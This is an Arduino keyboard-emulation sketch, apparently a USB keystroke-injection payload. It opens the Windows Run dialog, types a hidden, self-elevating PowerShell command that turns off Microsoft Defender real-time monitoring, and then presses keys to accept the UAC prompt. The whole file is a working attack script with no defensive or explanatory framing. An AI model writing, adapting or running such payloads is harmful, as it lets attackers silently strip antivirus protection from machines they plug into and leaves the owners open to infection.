#include <Keyboard.h>

void setup() {
  // Initialize the keyboard
  Keyboard.begin();
  delay(300); 

  // Disable Defender
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(300);

  typeString("powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs");
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100); 

  // // Wait for UAC prompt and press Left arrow + Enter (to select "Yes")
  delay(2500);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  Keyboard.end();
}

void typeString(const char* str) {
  while (*str) {
    Keyboard.write(*str);
    delay(4);
    str++;
  }
}

void loop() {
  // Nothing to do here
}